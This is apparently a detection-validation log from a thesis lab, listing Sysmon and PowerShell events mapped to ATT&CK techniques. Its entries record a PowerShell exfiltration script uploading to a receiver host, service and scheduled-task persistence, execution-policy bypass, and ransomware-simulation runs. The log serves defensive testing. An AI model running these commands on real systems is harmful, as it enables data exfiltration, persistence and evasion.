2026-06-24T12:54:20.862Z	P1	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 controlled upload process invocation	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.828Z	P1	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 controlled upload process invocation	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:20.862Z	P1	TEC-009	T1074.001 / T1560.001 / T1048.003	TEC-009 controlled upload process invocation	P1_EVENT_Sysmon_ID1_Process_Basic	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\exfiltracion_v3.ps1" -ReceiverUrl "http://192.168.1.129:8088/upload" -TimeoutSec 60 -EnableUpload -KeepArtifacts	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_Sysmon_ID1_Process_Basic-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.589Z	P1	TEC-005	T1569.002	TEC-005 high-confidence service execution	P1_EVENT_System7045_ServiceCreation	LT29.ait.us.es	System	Se instaló un servicio en el sistema. Nombre del servicio: TFM TEC005 Test Service Nombre del archivo del servicio: C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt Tipo de servicio: servicio de modo usuario Tipo de inicio de servicio: inicio por solicitud Cuenta de servicio: LocalSystem	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	7045	System 7045	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_System7045_ServiceCreation-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P1	TEC-009	T1048.003 / T1560.001	TEC-009 receiver network connection by PowerShell	P1_EVENT_TEC009_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_TEC009_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P1	TEC-009	T1048.003 / T1560.001	TEC-009 receiver network connection by PowerShell	P1_EVENT_TEC009_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_TEC009_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P1	TEC-009	T1048.003 / T1560.001	TEC-009 receiver network connection by PowerShell	P1_EVENT_TEC009_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_TEC009_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:21.811Z	P1	TEC-009	T1048.003 / T1560.001	TEC-009 receiver network connection by PowerShell	P1_EVENT_TEC009_Sysmon_Context	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	{ "RuleName": "-", "UtcTime": "2026-06-13 23:16:48.749", "ProcessGuid": "6BC49A7D-CAF5-6A3B-A366-000000009801", "ProcessId": 6232, "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "User": "LT29\\seguridad", "Protocol": "tcp", "Initiated": true, "SourceIsIpv6": false, "SourceIp": "192.168.1.143", "SourceHostname": "LT29.ait.us.es", "SourcePort": 64583, "SourcePortName": "-", "DestinationIsIpv6": false, "DestinationIp": "192.168.1.129", "DestinationHostname": "-", "DestinationPort": 8088, "DestinationPortName": "-" }	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	3	Sysmon ID 3	05_LOGS\Validas\Prueba_24_06_2026\P1_EVENT_TEC009_Sysmon_Context-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.989Z	P3	TEC-001	T1059.001	TEC-001 PowerShell suspicious execution	TEC001_PowerShell_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC001_PowerShell_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:54:37.594Z	P3	TEC-001	T1059.001	TEC-001 PowerShell suspicious execution	TEC001_PowerShell_4104	LT29.ait.us.es	Microsoft-Windows-PowerShell/Operational	function Test-Tec009Evidence { param( [AllowEmptyString()][string]$Command = "", [AllowEmptyString()][string]$ScriptPath = "", [AllowEmptyString()][string]$ReceiverUrl = "", [AllowEmptyString()][string]$HttpStatus = "", [AllowEmptyString()][string]$UploadSucceeded = "", [AllowEmptyString()][string]$ZipFile = "", [AllowEmptyString()][string]$CopyFile = "", [AllowEmptyString()][string]$LocalSHA256 = "", [AllowEmptyString()][string]$SummaryFile = "", $SummaryObject = $null, $PowerShell4104 = $null ) $checks = @() $checks += New-EvidenceCheckRow -CheckName "powershell.exe -File invocation" -Status $(if ($Command -match '(?i)powershell\.exe\s+-NoProfile\s+-ExecutionPolicy\s+Bypass\s+-File') { "OK" } else { "FAIL" }) -Expected "powershell.exe -NoProfile -ExecutionPolicy Bypass -File" -Found $Command -Evidence $Command -Comment "TEC-009 must run in an explicit PowerShell child process." $checks...	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	4104	PowerShell 4104	05_LOGS\Validas\Prueba_24_06_2026\TEC001_PowerShell_4104-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:22.945Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:31.999Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-008_Sabotaje\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:39.261Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-009_Exfiltracion\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:50.544Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Write-Host TEC001_OK; Start-Sleep 3"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:50:53.240Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('TEC001_BASE64_OK')); [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) | Write-Host; IEX 'Write-Host TEC001_IEX_OK'; Start-Sleep 2"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.196Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:04.226Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	cmd.exe /c "echo TEC002_OK & whoami & powershell.exe -NoProfile -Command Get-Process"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.029Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:16.075Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	schtasks.exe /create /tn "TFM-TEC-003" /tr "cmd.exe /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt" /sc once /st 14:56 /f	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:20.558Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /c echo TEC003_OK ^> C:\Users\Public\tec003_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.549Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:51.584Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	sc.exe create "TFM TEC005 Test Service" binPath= "C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt" start= demand	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:51:57.249Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	C:\Windows\System32\cmd.exe /c echo TEC005_OK ^> C:\Users\Public\tec005_ok.txt	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:15.255Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:35.934Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\crear_directorio_dummy.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:50.805Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\enumeracion.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
2026-06-24T12:52:54.853Z	P3	TEC-002	T1059.003	TEC-002 Windows Command Shell execution	TEC002_CMD_Sysmon	LT29.ait.us.es	Microsoft-Windows-Sysmon/Operational	"cmd.exe" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File "C:\Users\seguridad\Desktop\TFM\01_ACTIVE_TESTS\Pruebas\TEC-007_Ransomware\Scriptransom.ps1"	TEC_20260624	REAL	INCLUIDO_REAL_CANONICO_POR_TIMESTAMP_Y_CARPETA	1	Sysmon ID 1	05_LOGS\Validas\Prueba_24_06_2026\TEC002_CMD_Sysmon-2026-06-23T12_00_00Z-2026-06-24T12_00_00Z-C.364907172793f8c7.csv
